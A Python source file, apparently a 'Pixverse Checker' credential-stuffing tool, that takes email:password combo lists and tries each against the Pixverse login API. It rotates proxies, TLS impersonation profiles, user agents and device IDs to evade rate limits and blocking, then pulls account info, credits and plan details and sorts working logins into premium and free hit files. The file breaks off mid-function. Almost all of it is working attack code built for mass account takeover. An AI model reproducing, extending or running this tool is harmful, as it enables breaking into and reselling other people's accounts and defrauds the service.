import os
import re
import sys
import json
import time
import base64
import random
import string
import uuid
import hashlib
import threading
import subprocess
import configparser
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

try:
    from curl_cffi import requests as cffi
    _HAVE_CFFI = True
except ImportError:
    _HAVE_CFFI = False
    import requests as cffi

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EYELIFTER = "eyelifter"
EYELIFTER_VER = "v69"
EYELIFTER_YEAR = "2026"

_F1T = "UGl4"
_F2T = "dmVyc2U="
_F3T = "IENoZWNrZXI="
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "UGl4dmVyc2Vf"
_F2D = "QGV5ZWxpZnRlcg=="
_F1G = "VEc6IEBleWVsaWZ0ZXIg"
_F2G = "fCBAZGFya2h1Y2hhbm5lbA=="
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

EYELIFTER_SEAL = os.path.join(os.path.expanduser("~"), ".eyelifter.pix.seal")
_EYELIFTER_SEALED = None


def eyelifter_d(e):
    try:
        pad = "=" * (-len(e) % 4)
        return base64.b64decode(e + pad).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"eyelifter decode: {ex}")


def eyelifter_j(*p):
    return "".join(eyelifter_d(x) for x in p)


EYELIFTER_TOOL     = eyelifter_j(_F1T, _F2T, _F3T)
EYELIFTER_TG_USER  = eyelifter_j(_F1A, _F2A)
EYELIFTER_TG_CHAN  = eyelifter_j(_F1C, _F2C)
EYELIFTER_RESULTS  = eyelifter_j(_F1D, _F2D)
EYELIFTER_TAG      = eyelifter_j(_F1G, _F2G)
EYELIFTER_SEAL_STR = eyelifter_j(_F1S, _F2S)
EYELIFTER_LINE_TAG = f"by {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}"
EYELIFTER_EXPECTED = "Pixverse Checker"


def eyelifter_verify(ctx="x"):
    global _EYELIFTER_SEALED
    if _EYELIFTER_SEALED is True:
        return True
    if EYELIFTER_TOOL != EYELIFTER_EXPECTED:
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_TG_USER != "@samvir1" or EYELIFTER_TG_CHAN != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(EYELIFTER_SEAL):
        try:
            st = open(EYELIFTER_SEAL).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: build touched. restore original.")
    else:
        try:
            open(EYELIFTER_SEAL, "w").write(fp)
        except OSError:
            pass
    _EYELIFTER_SEALED = True
    return True


_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def eyelifter_color(c, s, b=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if b else ''}{c}m{s}{_RS}"


def eyelifter_vlen(s):
    import unicodedata
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def eyelifter_center(t, w):
    vl = eyelifter_vlen(t)
    if vl >= w:
        return t
    l = (w - vl) // 2
    return " " * l + t + " " * (w - vl - l)


_LV = {"SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
       "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False)}
_CL = threading.Lock()


def eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LV.get(level, ("0", False))
    with _CL:
        if _ANSI:
            print(f"{eyelifter_color('90', ts)} {emoji}  "
                  f"{eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def eyelifter_rline(i, t, st, txt, c, bold=False):
    with _CL:
        if _ANSI:
            print(f"{eyelifter_color('90', f'[{i}/{t}]')} "
                  f"{eyelifter_color(c, st.ljust(6), bold)} {txt}", flush=True)
        else:
            print(f"[{i}/{t}] {st.ljust(6)} {txt}", flush=True)


def eyelifter_section(t, width=62):
    print()
    lbl = f" {t} "
    vl = eyelifter_vlen(lbl)
    side = max(1, (width - vl) // 2)
    print(eyelifter_color("90", "─" * side) +
          eyelifter_color("96", lbl, True) +
          eyelifter_color("90", "─" * (width - vl - side)))


def eyelifter_divider(width=62):
    print(eyelifter_color("90", ("─" if _ANSI else "-") * width))


def eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(eyelifter_color("90", line * width))
    print(eyelifter_color("96", eyelifter_center(title, width), True))
    if sub:
        print(eyelifter_color("2", eyelifter_center(sub, width)))
    print(eyelifter_color("5", eyelifter_center(
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}", width)))
    print(eyelifter_color("90", line * width))


def eyelifter_summary(rows):
    print()
    print(eyelifter_color("96",
        f"═══ eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} ═══", True))
    if not rows:
        return
    wk = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {eyelifter_color('96', str(k).ljust(wk))}  "
              f"{eyelifter_color('0', str(v))}")
    print(eyelifter_color("96", "════════════════════════════════", True))
    print()


EYELIFTER_CFG_PATH = os.path.join(
    os.environ.get("PIX_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_pix.ini"
)
EYELIFTER_MAX_THREADS = 100


class EyelifterConfig:
    def __init__(self, cf=EYELIFTER_CFG_PATH):
        self.eyelifter = EYELIFTER
        self.config_file = cf
        self.cp = configparser.ConfigParser()
        self.cp.optionxform = str
        self.settings = {}
        self.eyelifter_load()

    def eyelifter_load(self):
        if not os.path.exists(self.config_file):
            self.eyelifter_default()
        try:
            self.cp.read(self.config_file, encoding="utf-8")
        except Exception:
            self.eyelifter_default()
            self.cp.read(self.config_file, encoding="utf-8")
        if "eyelifter" not in self.cp:
            self.cp["eyelifter"] = {}
        c = self.cp["eyelifter"]
        self.settings["threads"] = max(1, min(EYELIFTER_MAX_THREADS, c.getint("threads", 8)))
        self.settings["timeout"] = max(5, min(120, c.getint("timeout", 25)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(5, c.getint("retries", 1)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.5)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.4)))
        self.settings["rate_limit_delay"] = max(1, min(120, c.getint("rate_limit_delay", 12)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.settings["rotate_impersonate"] = c.getboolean("rotate_impersonate", True)
        self.settings["rotate_fingerprint"] = c.getboolean("rotate_fingerprint", True)
        self.settings["hit_spacer"] = c.getboolean("hit_spacer", True)
        self.settings["debug"] = c.getboolean("debug", False)

    def eyelifter_default(self):
        self.cp["eyelifter"] = {
            "threads": "8",
            "timeout": "25",
            "proxies_file": "proxies.txt",
            "retries": "1",
            "retry_delay": "1.5",
            "combo_delay": "0.4",
            "rate_limit_delay": "12",
            "skip_proxy_test": "false",
            "open_channel_on_launch": "true",
            "rotate_impersonate": "true",
            "rotate_fingerprint": "true",
            "hit_spacer": "true",
            "debug": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.cp.write(f)

    def eyelifter_save(self):
        if "eyelifter" not in self.cp:
            self.cp["eyelifter"] = {}
        for k, v in self.settings.items():
            self.cp["eyelifter"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.cp.write(f)


_EYELIFTER_CFG = EyelifterConfig()

EYELIFTER_BASE_API = "https://app-api.pixverse.ai"
EYELIFTER_BASE_APP = "https://app.pixverse.ai"
EYELIFTER_LOGIN_URL    = f"{EYELIFTER_BASE_API}/creative_platform/login"
EYELIFTER_USERINFO_URL = f"{EYELIFTER_BASE_API}/creative_platform/getUserInfo"
EYELIFTER_CREDITS_URL  = f"{EYELIFTER_BASE_API}/creative_platform/user/credits"
EYELIFTER_PLAN_URL     = f"{EYELIFTER_BASE_API}/creative_platform/toc/members/plan_details"

EYELIFTER_IMPERSONATE_POOL = [
    "chrome131",
    "chrome124",
    "chrome120",
    "chrome116",
    "chrome110",
    "chrome131_android",
    "chrome99_android",
    "safari17_0",
    "safari18_0_ios",
    "edge101",
    "firefox133",
]

EYELIFTER_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]


def eyelifter_rand_anon_id():
    return (f"1a0fe1ad79658-{uuid.uuid4().hex[:12]}-"
            f"{uuid.uuid4().hex[:7]}-{random.randint(100000, 999999)}-"
            f"{uuid.uuid4().hex[:12]}")


def eyelifter_pick_impersonate():
    if not _EYELIFTER_CFG.settings.get("rotate_impersonate", True):
        return "chrome131"
    return random.choice(EYELIFTER_IMPERSONATE_POOL)


def eyelifter_make_headers(anon_id=None, device_id=None, token=None):
    ua = (random.choice(EYELIFTER_UA_POOL)
          if _EYELIFTER_CFG.settings.get("rotate_fingerprint", True)
          else EYELIFTER_UA_POOL[0])
    h = {
        "user-agent": ua,
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US",
        "origin": EYELIFTER_BASE_APP,
        "referer": EYELIFTER_BASE_APP + "/",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "ai-anonymous-id": anon_id or eyelifter_rand_anon_id(),
        "ai-trace-id": str(uuid.uuid4()),
        "workspace-id": "0",
        "x-device-id": device_id or str(uuid.uuid4()),
        "x-marketing-email-consent": "true",
        "x-platform": "Web",
    }
    if token:
        h["token"] = token
    return h


def eyelifter_parse_proxy(l):
    l = l.strip()
    if not l or l.startswith("#"):
        return None
    if l.startswith(("http://", "https://", "socks4://", "socks5://")):
        return l
    p = l.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    return None


def eyelifter_load_proxies(path):
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = eyelifter_parse_proxy(ln)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def eyelifter_test_proxy(p):
    try:
        kw = {"proxies": {"http": p, "https": p}, "timeout": 10}
        if _HAVE_CFFI:
            kw["impersonate"] = eyelifter_pick_impersonate()
        r = cffi.get("https://api.ipify.org?format=json", **kw)
        return r.status_code == 200
    except Exception:
        return False


def eyelifter_filter_proxies(proxies):
    if not proxies:
        return []
    total = len(proxies)
    good = []
    done = [0]
    dead = [0]
    lock = threading.Lock()
    eyelifter_log("🌐", "STEP", "PROXY",
        f"testing {total} proxies (workers={min(80, total)}) [eyelifter]")

    def probe(p):
        ok = eyelifter_test_proxy(p)
        with lock:
            done[0] += 1
            d = done[0]
            if ok:
                good.append(p)
            else:
                dead[0] += 1
            if d % 20 == 0 or d == total:
                eyelifter_log("🔎", "STEP", "PROXY",
                    f"proxies {d}/{total} — {len(good)} live, {dead[0]} dead [eyelifter]")
        return ok

    with ThreadPoolExecutor(max_workers=min(100, max(1, total))) as ex:
        futs = [ex.submit(probe, p) for p in proxies]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    return good or proxies


_EYELIFTER_STOP = threading.Event()
_EYELIFTER_LK = threading.Lock()
_EYELIFTER_PK = threading.Lock()
_EYELIFTER_FK = threading.Lock()
_EYELIFTER_IK = threading.Lock()
_EYELIFTER_RL = threading.Lock()

_EYELIFTER_ST = {"checked": 0, "premium": 0, "free": 0, "bad": 0,
                 "errors": 0, "rl": 0, "pfails": 0}
_EYELIFTER_START = time.time()
_EYELIFTER_TOTAL = 0
_EYELIFTER_POOL = []
_EYELIFTER_BADP = set()
_EYELIFTER_COOLP = {}
_EYELIFTER_INUSE = set()
_EYELIFTER_RLU = 0.0

_EYELIFTER_PREMIUM_F = None
_EYELIFTER_FREE_F = None
_EYELIFTER_BAD_F = None
_EYELIFTER_ERR_F = None
_EYELIFTER_FOLDER = None


def eyelifter_reset_stats():
    global _EYELIFTER_ST, _EYELIFTER_START, _EYELIFTER_COOLP, _EYELIFTER_BADP, _EYELIFTER_RLU
    with _EYELIFTER_LK:
        _EYELIFTER_ST = {"checked": 0, "premium": 0, "free": 0, "bad": 0,
                         "errors": 0, "rl": 0, "pfails": 0}
        _EYELIFTER_START = time.time()
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP = {}
        _EYELIFTER_BADP = set()
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = 0.0


def eyelifter_pick_proxy(exclude=None):
    now = time.time()
    with _EYELIFTER_PK:
        avail = [p for p in _EYELIFTER_POOL
                 if p not in _EYELIFTER_BADP and _EYELIFTER_COOLP.get(p, 0.0) <= now]
    with _EYELIFTER_IK:
        free = [p for p in avail if p not in _EYELIFTER_INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _EYELIFTER_IK:
            _EYELIFTER_INUSE.add(p)
    return p


def eyelifter_rel_proxy(p):
    if not p:
        return
    with _EYELIFTER_IK:
        _EYELIFTER_INUSE.discard(p)


def eyelifter_bad_proxy(p):
    if not p:
        return
    with _EYELIFTER_PK:
        if p in _EYELIFTER_BADP:
            return
        _EYELIFTER_BADP.add(p)
    with _EYELIFTER_LK:
        _EYELIFTER_ST["pfails"] += 1


def eyelifter_cool_proxy(p, secs=120.0):
    if not p:
        return
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP[p] = time.time() + secs


def eyelifter_sw(fh, text):
    if fh is None:
        return
    with _EYELIFTER_FK:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def eyelifter_rl_backoff(s):
    global _EYELIFTER_RLU
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = max(_EYELIFTER_RLU, time.time() + s)


def eyelifter_rl_wait():
    while not _EYELIFTER_STOP.is_set():
        with _EYELIFTER_RL:
            gap = _EYELIFTER_RLU - time.time()
        if gap <= 0:
            return
        if _EYELIFTER_STOP.wait(min(gap, 1.0)):
            return


def eyelifter_num(v):
    try:
        if v in (None, "", "NA", "N/A"):
            return 0
        return float(v)
    except (TypeError, ValueError):
        return 0


def eyelifter_int(v):
    return int(eyelifter_num(v))


def eyelifter_classify(info, credits, plan):
    premium_type   = eyelifter_int(info.get("PremiumType"))
    subscription   = eyelifter_int(info.get("Subscription"))
    member_type    = eyelifter_int(info.get("MemberType"))
    expire_date    = eyelifter_int(info.get("ExpireDate"))
    fast_quota     = eyelifter_int(info.get("FastQuota"))
    fast_bonus     = eyelifter_int(info.get("FastBonusQuota"))
    price          = eyelifter_num(info.get("Price"))

    plan_name      = (plan.get("plan_name") or "").strip()
    current_plan   = eyelifter_int(plan.get("current_plan_type"))
    type_field     = eyelifter_int(plan.get("type"))
    remaining_days = eyelifter_int(plan.get("remaining_days"))
    plan_price     = eyelifter_num(plan.get("price"))
    plan_credit_d  = eyelifter_int(plan.get("credit_daily"))
    plan_credit_m  = eyelifter_int(plan.get("credit_monthly"))

    credit_daily    = eyelifter_int(credits.get("credit_daily"))
    credit_monthly  = eyelifter_int(credits.get("credit_monthly"))
    credit_package  = eyelifter_int(credits.get("credit_package"))
    renewal_credits = eyelifter_int(credits.get("renewal_credits"))

    reasons = []
    if premium_type > 1:
        reasons.append(f"PremiumType={premium_type}")
    if subscription > 0:
        reasons.append(f"Sub={subscription}")
    if member_type > 0:
        reasons.append(f"Member={member_type}")
    if expire_date > 0:
        reasons.append(f"Expire={expire_date}")
    if fast_quota > 0:
        reasons.append(f"FastQuota={fast_quota}")
    if fast_bonus > 0:
        reasons.append(f"FastBonus={fast_bonus}")
    if price > 0:
        reasons.append(f"Price={price}")
    if current_plan > 0:
        reasons.append(f"PlanType={current_plan}")
    if type_field > 0:
        reasons.append(f"Plan.type={type_field}")
    if remaining_days > 0:
        reasons.append(f"Days={remaining_days}")
    if plan_price > 0:
        reasons.append(f"PlanPrice={plan_price}")
    if credit_daily > 0:
        reasons.append(f"Daily={credit_daily}")
    if credit_monthly > 0:
        reasons.append(f"Monthly={credit_monthly}")
    if renewal_credits > 0:
        reasons.append(f"Renewal={renewal_credits}")
    if plan_credit_d > 0:
        reasons.append(f"PlanDaily={plan_credit_d}")
    if plan_credit_m > 0:
        reasons.append(f"PlanMonthly={plan_credit_m}")
    if plan_name and plan_name.lower() not in ("basic plan", "free plan", ""):
        reasons.append(f"Plan={plan_name}")

    meta = {
        "premium_type": premium_type,
        "plan_name": plan_name,
        "subscription": subscription,
        "member_type": member_type,
        "expire_date": expire_date,
        "credit_daily": credit_daily,
        "credit_monthly": credit_monthly,
        "credit_package": credit_package,
        "fast_quota": fast_quota,
        "renewal_credits": renewal_credits,
        "remaining_days": remaining_days,
        "plan_price": plan_price,
    }
    return reasons, meta


def eyelifter_build_session(proxy=None):
    imp = eyelifter_pick_impersonate()
    to = _EYELIFTER_CFG.settings["timeout"]
    if _HAVE_CFFI:
        try:
            s = cffi.Session(impersonate=imp, timeout=to)
        except Exception:
            try:
                s = cffi.Session(impersonate="chrome131", timeout=to)
            except Exception:
                s = cffi.Session(timeout=to)
    else:
        s = cffi.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def eyelifter_check_account(email, password, proxy=None):
    to = _EYELIFTER_CFG.settings["timeout"]
    s = eyelifter_build_session(proxy)

    anon_id = eyelifter_rand_anon_id()
    device_id = str(uuid.uuid4())
    hdrs = eyelifter_make_headers(anon_id=anon_id, device_id=device_id)
    s.headers.update(hdrs)

    login_headers = dict(hdrs)
    login_headers["content-type"] = "application/json"
    login_headers["error"] = "return"

    body = json.dumps({"Username": email, "Password": password})
    try:
        r = s.post(EYELIFTER_LOGIN_URL, data=body,
                   headers=login_headers, timeout=to)
    except Exception as e:
        return {"status": "error", "error_type": f"login_net_{type(e).__name__}"}

    if r.status_code == 429:
        return {"status": "error", "error_type": "rate_limit"}
    if r.status_code == 403:
        return {"status": "error", "error_type": "login_403"}
    if r.status_code >= 500:
        return {"status": "error", "error_type": f"login_{r.status_code}"}
    if r.status_code != 200:
        return {"status": "error", "error_type": f"login_{r.status_code}"}

    try:
        j = r.json() or {}
    except Exception:
        return {"status": "error", "error_type": "login_non_json"}

    err_code = j.get("ErrCode")
    err_msg = (j.get("ErrMsg") or "").lower()

    if err_code != 0:
        if any(x in err_msg for x in ("password", "incorrect", "invalid", "wrong",
                                       "not match", "not exist", "not found")):
            return {"status": "bad", "reason": "invalid_credentials"}
        if "verify" in err_msg:
            return {"status": "bad", "reason": "email_unverified"}
        return {"status": "bad", "reason": err_msg[:60] or f"code_{err_code}"}

    result = (j.get("Resp") or {}).get("Result") or {}
    token = result.get("Token")
    if not token:
        return {"status": "bad", "reason": "no_token"}

    auth_hdrs = eyelifter_make_headers(anon_id=anon_id,
                                       device_id=device_id, token=token)
    s.headers.update(auth_hdrs)

    info = {}
    credits = {}
    plan = {}

    try:
        ri = s.get(EYELIFTER_USERINFO_URL, timeout=to)
        if ri.status_code == 200:
            jj = ri.json() or {}
            if jj.get("ErrCode") == 0:
                info = jj.get("Resp") or {}
    except Exception:
        pass

    try:
        rc = s.get(EYELIFTER_CREDITS_URL, timeout=to)
        if rc.status_code == 200:
            jj = rc.json() or {}
            if jj.get("ErrCode") == 0:
                credits = jj.get("Resp") or {}
    except Exception:
        pass

    try:
        plan_hdr = dict(auth_hdrs)
        plan_hdr["content-type"] = "application/json"
        rp = s.post(EYELIFTER_PLAN_URL, data=json.dumps({}),
                    headers=plan_hdr, timeout=to)
        if rp.status_code == 200:
            jj = rp.json() or {}
            if jj.get("ErrCode") == 0:
                plan = jj.get("Resp") or {}
    except Exception:
        pass

    reasons, meta = eyelifter_classify(info, credits, plan)

    return {
        "status": "ok",
        "email": email,
        "password": password,
        "username": result.get("Username") or info.get("Username") or "-",
        "account_id": result.get("AccountId") or info.get("AccountId"),
        "register_country": info.get("register_country") or "-",
        "hit_reasons": reasons,
        "meta": meta,
        "paid": bool(reasons),
    }


def eyelifter_run_retry(combo, proxy):
    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()

    attempts = _EYELIFTER_CFG.settings.get("retries", 1) + 1
    lp = proxy
    result = None

    try:
        for a in range(attempts):
            if _EYELIFTER_STOP.is_set():
                break
            if a > 0:
                np = eyelifter_pick_proxy(exclude=lp)
                if np:
                    if lp and lp != np:
                        eyelifter_rel_proxy(lp)
                    proxy = np
                eyelifter_log("🔁", "STEP", "RETRY",
                    f"attempt {a+1}/{attempts} · rotating fp · "
                    f"{email[:40]} [eyelifter]")
            lp = proxy

            try:
                result = eyelifter_check_account(email, password, proxy)
            except Exception as e:
                result = {"status": "error",
                          "error_type": f"crash_{type(e).__name__}"}

            if result.get("status") in ("ok", "bad"):
                break

            et = result.get("error_type", "")
            is_last = a == attempts - 1

            if et == "rate_limit":
                with _EYELIFTER_LK:
                    _EYELIFTER_ST["rl"] += 1
                if proxy:
                    eyelifter_cool_proxy(proxy, 120.0)
                w = min(_EYELIFTER_CFG.settings.get("rate_limit_delay", 12) * (2 ** a), 120)
                eyelifter_rl_backoff(w)
                if _EYELIFTER_STOP.wait(w * (0.7 + random.random() * 0.6)):
                    break
                continue

            if et in ("login_403",):
                if proxy:
                    eyelifter_bad_proxy(proxy)
                if not is_last and _EYELIFTER_STOP.wait(
                        _EYELIFTER_CFG.settings.get("retry_delay", 1.5)):
                    break
                continue

            if et.startswith("login_net_"):
                if proxy is None:
                    break
                eyelifter_bad_proxy(proxy)
                if not is_last and _EYELIFTER_STOP.wait(
                        _EYELIFTER_CFG.settings.get("retry_delay", 1.5)):
                    break
                continue

            if et in ("login_non_json", "no_result"):
                if proxy:
                    eyelifter_cool_proxy(proxy, 20.0)
                backoff = min(2.0 * (2 ** a), 30.0)
                jitter = backoff * (0.5 + random.random() * 0.6)
                if not is_last and _EYELIFTER_STOP.wait(jitter):
                    break
                continue

            if not is_last and _EYELIFTER_STOP.wait(
                    _EYELIFTER_CFG.settings.get("retry_delay", 1.5)):
                break
    finally:
        if lp:
            eyelifter_rel_proxy(lp)

    return result or {"status": "error", "error_type": "no_result"}


def eyelifter_fmt_line(u, status, for_file=False):
    tag = {"premium": "PREMIUM", "free": "FREE"}.get(status, "?")
    parts = [f"UID={u.get('account_id', '-')}"]
    if u.get("username") and u["username"] != "-":
        parts.append(f"Name={u['username']}")
    if u.get("register_country") and u["register_country"] != "-":
        parts.append(f"Country={u['register_country']}")
    m = u.get("meta") or {}
    if m.get("plan_name") and m["plan_name"].lower() not in ("basic plan", "free plan", ""):
        parts.append(f"Plan={m['plan_name']}")
    if m.get("premium_type"):
        parts.append(f"PT={m['premium_type']}")
    if m.get("credit_daily"):
        parts.append(f"Daily={m['credit_daily']}")
    if m.get("credit_monthly"):
        parts.append(f"Monthly={m['credit_monthly']}")
    if m.get("credit_package"):
        parts.append(f"Pkg={m['credit_package']}")
    if m.get("fast_quota"):
        parts.append(f"Fast={m['fast_quota']}")
    if m.get("remaining_days"):
        parts.append(f"Days={m['remaining_days']}")
    if status == "premium" and u.get("hit_reasons"):
        parts.append(f"Reason={','.join(u['hit_reasons'][:3])}")
    if for_file:
        parts.append(EYELIFTER_LINE_TAG)
    return f"{tag} {u['email']}:{u['password']} | " + " | ".join(parts)


def eyelifter_spacer():
    return "\n\n" if _EYELIFTER_CFG.settings.get("hit_spacer", True) else "\n"


def eyelifter_record(combo, result):
    global _EYELIFTER_PREMIUM_F, _EYELIFTER_FREE_F, _EYELIFTER_BAD_F, _EYELIFTER_ERR_F

    st = result.get("status")
    if st == "ok":
        verdict = "premium" if result.get("paid") else "free"
        u = result
    elif st == "bad":
        verdict = "bad"
        u = None
    else:
        verdict = "error"
        u = None

    with _EYELIFTER_LK:
        _EYELIFTER_ST["checked"] += 1
        done = _EYELIFTER_ST["checked"]
        if verdict == "premium":
            _EYELIFTER_ST["premium"] += 1
        elif verdict == "free":
            _EYELIFTER_ST["free"] += 1
        elif verdict == "bad":
            _EYELIFTER_ST["bad"] += 1
        else:
            _EYELIFTER_ST["errors"] += 1
        total = _EYELIFTER_TOTAL

    sp = eyelifter_spacer()

    if verdict == "premium":
        line_term = eyelifter_fmt_line(u, "premium", for_file=False)
        line_file = eyelifter_fmt_line(u, "premium", for_file=True)
        eyelifter_rline(done, total, "PREMIUM", line_term, "32", True)
        eyelifter_sw(_EYELIFTER_PREMIUM_F, line_file + sp)
    elif verdict == "free":
        line_term = eyelifter_fmt_line(u, "free", for_file=False)
        line_file = eyelifter_fmt_line(u, "free", for_file=True)
        eyelifter_rline(done, total, "FREE", line_term, "36")
        eyelifter_sw(_EYELIFTER_FREE_F, line_file + sp)
    elif verdict == "bad":
        reason = result.get("reason", "invalid")
        eyelifter_rline(done, total, "BAD", f"BAD {combo} | {reason}", "31")
        eyelifter_sw(_EYELIFTER_BAD_F,
                     f"BAD {combo} | {reason} | {EYELIFTER_LINE_TAG}{sp}")
    else:
        et = result.get("error_type", "unknown")
        eyelifter_rline(done, total, "ERR", f"ERR {combo} | [{et}]", "33")
        eyelifter_sw(_EYELIFTER_ERR_F,
                     f"ERR {combo} | [{et}] | {EYELIFTER_LINE_TAG}{sp}")


_EYELIFTER_COMBORX = re.compile(
    r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)', re.I)


def eyelifter_extract_combos(content):
    out = set()
    skipped = 0
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBORX.match(line)
        if m:
            e = m.group(1).lower()
            p = m.group(2)
            if e and p:
                out.add(f"{e}:{p}")
        else:
            skipped += 1
    if skipped:
        eyelifter_log("🧹", "INFO", "EXTRACT",
                      f"{skipped} lines skipped [eyelifter]")
    return sorted(out)


def eyelifter_open_files(folder):
    names = ["pixverse_premium.txt", "pixverse_free.txt",
             "pixverse_bad.txt", "pixverse_errors.txt"]
    op = []
    try:
        for n in names:
            op.append(open(os.path.join(folder, n), "w", encoding="utf-8"))
    except Exception:
        for h in op:
            try:
                h.close()
            except Exception:
                pass
        raise
    return op


class EyelifterRunner:
    def __init__(self, combos):
        self.eyelifter = "eyelifter"
        self.combos = combos
        self.threads = _EYELIFTER_CFG.settings["threads"]
        self.gap = _EYELIFTER_CFG.settings.get("combo_delay", 0.4)
        self.chunk = max(self.threads * 2, 100)

    def eyelifter_task(self, combo):
        if _EYELIFTER_STOP.is_set():
            return
        if self.gap > 0:
            if _EYELIFTER_STOP.wait(self.gap * (0.5 + random.random())):
                return
        if _EYELIFTER_STOP.is_set():
            return
        proxy = eyelifter_pick_proxy() if _EYELIFTER_POOL else None
        try:
            result = eyelifter_run_retry(combo, proxy)
        except Exception as e:
            result = {"status": "error",
                      "error_type": f"runner_{type(e).__name__}"}
        try:
            eyelifter_record(combo, result)
        except Exception:
            pass

    def eyelifter_run(self):
        inflight = set()
        ex = ThreadPoolExecutor(max_workers=self.threads)
        try:
            for i in range(0, len(self.combos), self.chunk):
                if _EYELIFTER_STOP.is_set():
                    break
                batch = self.combos[i:i + self.chunk]
                for c in batch:
                    if _EYELIFTER_STOP.is_set():
                        break
                    inflight.add(ex.submit(self.eyelifter_task, c))
                while inflight:
                    done, pending = wait(inflight, timeout=0.5,
                                         return_when=FIRST_COMPLETED)
                    for f in done:
                        inflight.discard(f)
                        try:
                            f.result(timeout=0.1)
                        except Exception:
                            pass
                    if _EYELIFTER_STOP.is_set() and not done:
                        break
            while inflight:
                done, pending = wait(inflight, timeout=0.5,
                                     return_when=FIRST_COMPLETED)
                for f in done:
                    inflight.discard(f)
                    try:
                        f.result(timeout=0.1)
                    except Exception:
                        pass
        except KeyboardInterrupt:
            _EYELIFTER_STOP.set()
        finally:
            _EYELIFTER_STOP.set()
            try:
                ex.shutdown(wait=True, cancel_futures=True)
            except TypeError:
                ex.shutdown(wait=True)


def eyelifter_ask_threads():
    print()
    print(eyelifter_color("96", f"  Threads [eyelifter]  (1-{EYELIFTER_MAX_THREADS})"))
    print(eyelifter_color("90", f"  current: {_EYELIFTER_CFG.settings['threads']}"))
    raw = input(eyelifter_color("96", "  > ")).strip()
    if not raw:
        return _EYELIFTER_CFG.settings["threads"]
    try:
        t = int(raw)
    except ValueError:
        return _EYELIFTER_CFG.settings["threads"]
    return max(1, min(EYELIFTER_MAX_THREADS, t))


def eyelifter_single_check(proxies):
    global _EYELIFTER_POOL, _EYELIFTER_BADP, _EYELIFTER_FOLDER
